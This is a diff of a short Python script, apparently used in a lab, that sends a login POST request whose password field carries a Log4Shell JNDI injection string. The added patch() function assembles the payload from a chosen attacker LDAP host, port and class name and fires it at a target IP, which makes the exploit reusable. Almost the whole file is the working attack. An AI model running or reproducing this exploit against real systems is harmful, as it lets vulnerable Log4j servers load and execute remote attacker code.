@@ -1,6 +1,7 @@
 # import package that can send http requests
 import requests
-
+import socket
+import time
 # define function that will send a post request
 def post_form(ip, username, password):
 
@@ -13,14 +14,9 @@ def post_form(ip, username, password):
 
 
 
-def main():
-    # a list of ip addresses
-    ip_list = ["192.168.98.144"]
-    for ip in ip_list:
-        print(ip)
-        post_form(ip, "admin", "${jndi:ldap://192.168.98.130:1389/Exp}")
-        
-    
+def patch(ip , ldap_ip, ldap_port, exp):
+    password = "${jndi:ldap://"+ldap_ip+":"+str(ldap_port)+"/"+exp+"}"
+    print(password)
+    post_form(ip, "admin", password)
 
-if __name__ == '__main__':
-    main()
+patch('192.168.98.144', '192.168.98.130', 1389, 'Exp')
